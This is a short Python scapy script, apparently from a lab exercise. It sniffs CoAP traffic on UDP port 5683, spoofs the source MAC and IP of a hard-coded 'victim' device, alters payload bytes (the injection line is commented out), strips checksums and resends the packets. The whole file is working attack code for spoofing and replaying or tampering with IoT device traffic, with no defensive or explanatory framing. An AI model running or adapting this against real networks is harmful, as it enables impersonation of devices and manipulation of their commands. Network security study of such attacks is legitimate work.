from scapy.all import *

victim_IP = "192.168.1.83"
victim_MAC = "08:00:27:4e:39:3c"



def print_packet(pkt):
    load_packt = pkt[UDP].load
    part_load_packt = load_packt[:2] + b'1'+ b'1' + load_packt[5:]
    print("Modified Load:", end='')
    print(part_load_packt)
    pkt[Ether].src = victim_MAC
    pkt[IP].src = victim_IP
   # pkt[UDP].load = part_load_packt
    del pkt[IP].chksum
    del pkt[UDP].chksum
    print(pkt.show())
    sendp(pkt)



sniff(filter="udp and dst port 5683",iface="eth0",prn=print_packet)
